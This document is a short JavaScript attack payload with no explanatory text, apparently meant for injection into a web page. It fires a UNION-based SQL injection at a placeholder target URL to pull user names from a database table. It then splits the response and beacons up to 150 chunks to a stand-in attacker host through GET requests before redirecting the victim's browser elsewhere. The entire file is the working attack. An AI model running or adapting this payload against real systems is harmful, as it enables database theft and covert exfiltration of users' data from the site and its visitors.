var uri = "https://<targetURL>?param=";
var sqli = "1'+UNION+SELECT+null,userName,name,null,null,null,null,null,null,null,null,null,null,null,null,null FROM [dbo].[<databaseName>];--+";
var beacon_address = "https://<attackerURL>/?p=";

function read_body(xhr) {
   var data;
   if (!xhr.responseType || xhr.responseType === "text") {
       data = xhr.responseText;
   } else if (xhr.responseType === "document") {
       data = xhr.responseXML;
   } else if (xhr.responseType === "json") {
       data = xhr.responseJSON;
   } else {
       data = xhr.response;
   }
   return data;
}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
   if (xhr.readyState == XMLHttpRequest.DONE) {
	for (let i = 0; i < 150; i++) {
	var payload = read_body(xhr).split("div")[i];
	var beacon_uri = beacon_address;
	xhr2 = new XMLHttpRequest();
	xhr2.open("GET", beacon_uri + payload, true);
	xhr2.send();
	}
   }
}

xhr.open('GET', uri + sqli, true);
xhr.send(null);

location.href = '<redirectURL>';